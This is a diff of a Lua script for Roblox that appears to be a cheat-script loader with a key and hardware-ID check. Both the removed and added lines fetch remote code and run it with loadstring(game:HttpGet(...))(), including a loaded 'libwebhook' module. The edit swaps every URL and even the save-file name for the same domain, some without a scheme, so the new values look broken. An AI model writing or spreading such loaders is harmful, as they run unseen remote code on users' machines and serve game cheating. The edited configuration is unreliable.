@@ -7,9 +7,9 @@ local LocalPlayer = Players.LocalPlayer
 local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
 local Lighting = game:GetService("Lighting")
 
-local GETKEY_URL = "https://reaper-keysystem.vercel.app/"
-local DATABASE_URL = "https://keysystem-reaper-default-rtdb.asia-southeast1.firebasedatabase.app/keys/"
-local SAVE_FILE_NAME = "reaper_saved_key.txt"
+local GETKEY_URL = "https://reaperhub.xyz"
+local DATABASE_URL = "https://reaperhub.xyz"
+local SAVE_FILE_NAME = "reaperhub.xyz"
 
 local function GetHWID()
     local success, hwidValue = pcall(function()
@@ -37,14 +37,14 @@ local function SafeHttpRequest(requestData)
 end
 
 local function RunMainScript()
-    if _G.Script_Language == "Thai" then
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/Swiftz007/Normal/refs/heads/main/Thaixyz.lua"))()
+    if _G.Script_Mode == "X" then
+        loadstring(game:HttpGet("https://reaperhub.xyz"))()
     else
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/Swiftz007/Normal/refs/heads/main/kingxyz.lua"))()
+        loadstring(game:HttpGet("reaperhub.xyz"))()
     end
     
     task.wait(2)
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/Swiftz007/Libwtf/refs/heads/main/libwebhook2.lua"))()
+    loadstring(game:HttpGet("https://reaperhub.xyz"))()
 end
 
 local API = {}
